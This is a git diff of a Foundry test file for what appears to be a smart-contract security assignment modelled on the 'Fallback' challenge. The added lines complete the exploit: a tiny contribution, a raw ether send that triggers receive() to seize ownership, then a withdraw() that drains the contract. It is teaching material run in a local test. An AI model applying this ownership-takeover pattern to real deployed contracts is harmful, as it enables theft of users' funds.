@@ -10,7 +10,7 @@ contract FallbackTest is Test {
 
     function setUp() public {
         student = vm.addr(1);
-        vm.deal(student, 1 ether); // Fund student account
+        vm.deal(student, 5 ether); // Fund student account
         fallbackContract = new Assignment11();
     }
 
@@ -18,11 +18,14 @@ contract FallbackTest is Test {
         vm.startPrank(student);
         
         // Contribute a small amount (less than 0.001 ether) to the contract
-
+        fallbackContract.contribute{value: 0.00000000000000001 ether}();//this is how to call paybal function
         // Send ether to the contract trigger receive() and become the owner
+        //payable(address(fallbackContract)).transfer(0.0001 ether);
+        (bool success,)= address(fallbackContract).call{value: 1 wei, gas: 100000}("");
+         require(success, "contrat receive failed");
 
         // Withdraw all funds
-
+        fallbackContract.withdraw();
         vm.stopPrank();
     }
 
